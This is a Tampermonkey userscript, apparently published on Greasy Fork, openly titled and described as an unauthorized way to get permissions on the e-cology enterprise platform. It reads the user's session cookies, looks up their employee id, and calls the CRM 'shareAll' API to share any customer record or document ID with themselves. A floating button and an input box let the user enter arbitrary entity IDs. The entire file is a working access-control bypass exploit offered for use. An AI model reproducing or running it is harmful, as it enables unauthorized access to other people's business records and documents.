// ==UserScript==
// @name         e-cology Unauthorized Get Permissions
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  Unauthorized sharing of arbitrary entity
// @author       Douglas Lee
// @license      MIT
// @match        https://www.e-cology.com.cn/*
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_cookie
// @grant        GM_addStyle
// @run-at       document-end
// @connect      www.e-cology.com.cn
// @downloadURL https://update.greasyfork.org/scripts/505739/e-cology%20Unauthorized%20Get%20Permissions.user.js
// @updateURL https://update.greasyfork.org/scripts/505739/e-cology%20Unauthorized%20Get%20Permissions.meta.js
// ==/UserScript==

(function() {
    'use strict';

    let urlPatterns = [
        /customerViewPage\/(\d+)__targetId=/,
        /docDetail\/(\d+)$/
    ];

    let entityIds = '';
    for (let pattern of urlPatterns) {
        let match = window.location.href.match(pattern);
        if (match) {
            entityIds = match[1];
            break;
        }
    }

    function getSid(callback) {
        GM_cookie('list', { url: 'https://www.e-cology.com.cn/' }, function(cookies) {
            let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

            GM_xmlhttpRequest({
                method: "GET",
                url: "https://www.e-cology.com.cn/api/hrm/card/getCurrentSimpleEmployee",
                headers: {
                    "Content-Type": "application/json;charset=UTF-8",
                    "Cookie": cookieString,
                    "Accept": "application/json, text/plain, */*"
                },
                onload: function(response) {
                    let jsonResponse = JSON.parse(response.responseText);
                    if (jsonResponse && jsonResponse.data && jsonResponse.data.id) {
                        callback(jsonResponse.data.id);
                    }
                }
            });
        });
    }

    window.getPermissions = function(entityIds) {
        getSid(function(sid) {
            GM_cookie('list', { url: 'https://www.e-cology.com.cn/' }, function(cookies) {
                let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

                let data = {
                    "departmentIds": "",
                    "entityIds": entityIds,
                    "groupIds": "",
                    "module": "customer",
                    "shareType": "sharer",
                    "sids": `${sid},`
                };

                GM_xmlhttpRequest({
                    method: "POST",
                    url: "https://www.e-cology.com.cn/api/crm/common/share/shareAll.common",
                    headers: {
                        "Content-Type": "application/json;charset=UTF-8",
                        "Cookie": cookieString,
                        "Accept": "application/json, text/plain, */*"
                    },
                    data: JSON.stringify(data),
                    onload: function(response) {
                        location.reload();
                    },
                    onerror: function(error) {
                        alert('An error occurred: ' + error.statusText);
                    }
                });
            });
        });
    };

    // 添加浮动按钮
    let button = document.createElement('button');
    button.innerHTML = 'get Permissions';
    button.style.position = 'fixed';
    button.style.right = '10px';
    button.style.bottom = '50px';
    button.style.zIndex = '1000';
    button.style.backgroundColor = '#4CAF50';
    button.style.color = 'white';
    button.style.border = 'none';
    button.style.padding = '10px';
    button.style.cursor = 'pointer';
    document.body.appendChild(button);

    // 创建弹出框
    let modal = document.createElement('div');
    modal.style.display = 'none';
    modal.style.position = 'fixed';
    modal.style.right = '10px';
    modal.style.bottom = '50px';
    modal.style.zIndex = '1000';
    modal.style.backgroundColor = 'white';
    modal.style.padding = '20px';
    modal.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.1)';
    document.body.appendChild(modal);

    let entityIdsInput = document.createElement('input');
    entityIdsInput.placeholder = 'Enter entityIds';
    entityIdsInput.style.width = '100%';
    entityIdsInput.style.marginBottom = '10px';
    modal.appendChild(entityIdsInput);

    let submitButton = document.createElement('button');
    submitButton.innerHTML = 'Get Permissions';
    submitButton.style.backgroundColor = '#008CBA';
    submitButton.style.color = 'white';
    submitButton.style.border = 'none';
    submitButton.style.padding = '10px';
    submitButton.style.cursor = 'pointer';
    modal.appendChild(submitButton);

    // 显示/隐藏弹出框
    button.addEventListener('click', function(event) {
        event.preventDefault();
        event.stopPropagation();
        if (entityIds) {
            window.getPermissions(entityIds);
        } else {
            // 如果未匹配到URL，则展开弹出框
            modal.style.display = modal.style.display === 'none' ? 'block' : 'none';
        }
    });

    // 发送POST请求
    submitButton.addEventListener('click', function(event) {
        event.preventDefault();
        event.stopPropagation();
        entityIds = entityIdsInput.value;
        window.getPermissions(entityIds);
    });
})();
